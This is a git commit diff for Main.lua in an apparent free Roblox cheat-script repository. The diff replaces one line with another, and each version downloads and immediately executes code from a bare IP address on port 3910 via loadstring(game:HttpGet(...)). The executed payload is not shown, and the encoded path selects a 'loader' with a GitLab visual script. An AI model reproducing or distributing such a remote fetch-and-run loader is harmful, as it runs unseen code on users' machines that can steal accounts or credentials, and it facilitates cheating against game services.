a0ad22c1bdd7187a563a5535881c2f1b31bc68b6
Free-Keyless-Script <wakzz69@gmail.com>
2026-02-28 12:57:13 +0800

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImQ3MmU4ZTM0LWNmNTctNGY2NS1hNTc5LWJiYjViOWJlODMxNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImQ3MmU4ZTM0LWNmNTctNGY2NS1hNTc5LWJiYjViOWJlODMxNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2dpdGxhYi5jb20vcmxieC1zY3JpcHRzL2VseXNpdW0vLS9yYXcvbWFpbi9tbTItdmlzdWFsIn19"))()
